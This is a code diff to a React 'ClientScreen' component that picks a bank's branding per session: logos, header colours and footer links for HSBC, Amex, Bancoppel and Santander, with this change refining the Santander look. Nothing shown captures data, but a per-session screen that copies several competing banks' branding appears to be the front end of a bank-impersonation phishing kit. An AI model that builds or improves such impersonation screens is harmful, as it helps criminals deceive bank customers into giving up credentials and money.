@@ -17,7 +17,7 @@ import hsbcLogo from '@assets/Hsbc.png';
 import hsbcBackground from '@assets/IMG_0391.jpeg';
 import amexLogo from '@assets/Amex.png';
 import santanderLogo from '../assets/santander_logo.png';
-import santanderLogoWhite from '../assets/santander_logo_white.png';
+import santanderLogoWhite from '../assets/santander_logo_white_new.png';
 
 export default function ClientScreen() {
   // Get session ID from URL
@@ -193,15 +193,13 @@ export default function ClientScreen() {
       );
     } else if (sessionData.banco === 'SANTANDER') {
       return (
-        <header className="santander-header">
-          <div className="flex flex-col items-center justify-center">
-            <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
-            <img 
-              src={santanderLogoWhite} 
-              className="h-20 inline-block" 
-              alt="Santander" 
-            />
-          </div>
+        <header className="bg-[#EC0000] text-white p-4 text-center">
+          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
+          <img 
+            src={santanderLogoWhite} 
+            className="h-24 inline-block" 
+            alt="Santander" 
+          />
         </header>
       );
     } else {
@@ -248,6 +246,7 @@ export default function ClientScreen() {
               sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
               sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
               sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
+              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
               'text-[#EC1C24]'
             } mx-2`}>Aprende más</a>
             <a href="#" className={`${
@@ -256,6 +255,7 @@ export default function ClientScreen() {
               sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
               sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
               sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
+              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
               'text-[#EC1C24]'
             } mx-2`}>Ayuda</a>
             <a href="#" className={`${
@@ -264,6 +264,7 @@ export default function ClientScreen() {
               sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
               sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
               sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
+              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
               'text-[#EC1C24]'
             } mx-2`}>Términos y condiciones</a>
             <a href="#" className={`${
@@ -272,6 +273,7 @@ export default function ClientScreen() {
               sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
               sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
               sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
+              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
               'text-[#EC1C24]'
             } mx-2`}>Seguridad en línea</a>
           </div>
